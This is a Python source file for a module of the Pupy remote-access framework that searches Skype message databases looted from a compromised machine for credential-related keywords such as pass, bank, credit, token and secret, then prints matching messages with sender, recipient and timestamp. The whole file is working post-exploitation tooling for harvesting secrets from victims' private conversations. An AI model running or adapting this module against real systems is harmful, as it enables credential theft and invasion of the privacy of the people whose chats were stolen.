# -*- coding: utf-8 -*-

# Author: DGZN

from pupylib.PupyModule import *
from rpyc.utils.classic import download

import re
import os
import os.path
import ntpath
import datetime
import sqlite3
from itertools import compress
from pupylib.utils.term import colorize


__class_name__="SearchSkype"

@config(cat="gather", compatibilities=['darwin', 'windows'], tags=['gather', 'skype'])
class SearchSkype(PupyModule):

    """
        searches skype looted Skype databases for keywords
        Default Keywords
        pass, user, account, bank, credit, cc, login, secret, key, private, credential, access, token, authenticate, root, permission
    """

    def init_argparse(self):
        self.arg_parser = PupyArgumentParser(prog='search_skype', description=self.__doc__)
        self.arg_parser.add_argument('--include', nargs='+', metavar='additional keywords, ', help='Keywords to be included with the default list.')
        self.arg_parser.add_argument('--only', nargs='+', metavar='custom list of keywords, ', help='Only search this list of keywords.')


    def run(self, args):
        self.rep = os.path.join("data", "downloads", self.client.short_name(), "skype")
        if os.path.exists(self.rep):
            user_dbs = []
            for db in os.listdir(self.rep):
                user_db, ext = os.path.splitext(db)
                if ext == '.db':
                    user_dbs.append(os.path.join("data", "downloads", self.client.short_name(), "skype", db))

            keywords = ['pass', 'user', 'account', 'bank', 'credit', 'cc',
                                'login', 'secret', 'key', 'private', 'credential',
                                'access', 'token', 'authenticate', 'root', 'permission']
            if args.only:
                keywords = args.only
            elif args.include:
                keywords = args.include + keywords

            if user_dbs:
                self.findLoot(user_dbs, keywords)
        else:
            self.log('There are no Skype databases download for this session.')

    def findLoot(self, dbs, keywords):
        for db in dbs:
            user_name = db.split('.db')[0]
            conn = sqlite3.connect(db)
            cursor = conn.execute("SELECT id, chatname, timestamp__ms, body_xml FROM Messages")
            for row in cursor:
                found_match = False
                if row[3]:
                    message = row[3].encode('ascii', 'replace')
                    keywords = [s.lower() for s in keywords]

                    for keyword in keywords:
                        pattern = re.compile(r'\b%s\b' % re.escape(keyword), re.I | re.M)
                        it = re.finditer(pattern, message)
                        for match in it:
                            found_match = True
                            message = message.replace(match.group(), '\x1b[6;30;42m' + match.group() + '\x1b[0m')

                    if found_match:
                        self.log('- - - - - - - - {0} - - - - - - - - \n'.format(datetime.datetime.fromtimestamp(int(row[2] / 1000)).strftime('%Y-%m-%d %H:%M:%S')))
                        self.log('[ID]:     {0}'.format(row[0]))
                        self.log('[From]:   {0}'.format(row[1].split('@')[0].split('/')[0].replace('#', '')))
                        self.log('[To]:     {0}'.format(user_name))
                        self.log('[Message] {0}'.format(message))
                        self.log('\n- - - - - - - - - - - - - - - - - - - - - - - - - -  \n')
            conn.close()
